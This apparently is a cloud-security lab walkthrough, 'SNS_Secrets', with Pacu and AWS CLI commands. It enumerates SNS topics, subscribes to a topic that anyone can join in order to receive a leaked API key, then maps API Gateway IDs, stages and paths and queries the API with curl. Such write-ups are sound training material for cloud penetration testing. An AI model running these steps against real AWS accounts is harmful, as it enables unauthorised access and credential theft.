---------------

### SNS_Secrets

---------------

- Enumerating for sns_topics with Pacu-:
>Amazon Simple Notification Service (Amazon SNS) is a managed service that provides message delivery from publishers to subscribers (also known as producers and consumers). Publishers communicate asynchronously with subscribers by sending messages to a topic, which is a logical access point and communication channel.
```bash
run sns__enum --region us-east-1
```

<img width="967" height="212" alt="image" src="https://github.com/user-attachments/assets/358c2715-623a-4d2e-b070-527dfb824967" />

- Enter `data` to check the data

<img width="1267" height="674" alt="image" src="https://github.com/user-attachments/assets/4a442950-b437-4209-b43c-27d49ba93508" />

- If our IAM user has “sns:Get-Topic-Attributes” action or permission to the target SNS topic, we can then run the command below to get more info of the SNS.It is set to wild card which means anyone can subscribe to it.

```bash
aws sns get-topic-attributes --topic-arn  --profile sns_secrets| jq
```

<img width="1915" height="426" alt="image" src="https://github.com/user-attachments/assets/95ec2aad-ca05-41f2-88f9-34e9d4e84030" />

- Use `sns_subscribe` to exploit it.

```bash
run sns__subscribe --topics <arn:number> --email <email>
```

- You get a mail, then you subscribe to it and wait for an api key.

<img width="1912" height="119" alt="image" src="https://github.com/user-attachments/assets/db2c1aea-ef7d-484d-b4a8-e9ae9508d300" />

- Enumerating api gateways-:

```bash
aws apigateway get-rest-apis --profile sns-secrets --region us-east-1
aws apigateway get-rest-apis --profile sns_secrets --region us-east-1 --query "items[*].id" | jq
```

<img width="1090" height="479" alt="image" src="https://github.com/user-attachments/assets/a4ece616-4fa3-47ef-bd2b-0cfdcb3fb1bd" />

- This provides the id of the api gateway that we can use for further enumeration like `Stage name` and `Resource Path`.

```bash
aws apigateway get-stages --rest-api-id [API ID] --profile sns-secrets --region us-east-1
aws apigateway get-resources --rest-api-id [API ID] --profile sns-secrets --region us-east-1
```
<img width="1515" height="771" alt="image" src="https://github.com/user-attachments/assets/3a6b4eb5-28e5-480e-b772-3662c6e922eb" />

<img width="1452" height="720" alt="image" src="https://github.com/user-attachments/assets/21e79734-6ec0-4191-a2e7-6688089ef960" />

- Next thing is to make a request to the rest-api with `curl`

```url
https://[api id].execute-api.us-east-1.amazonaws.com/[stage name]/[path]
```

<img width="1908" height="104" alt="image" src="https://github.com/user-attachments/assets/06eb1c1c-c600-4af0-a207-ee45fce696ce" />


---------------
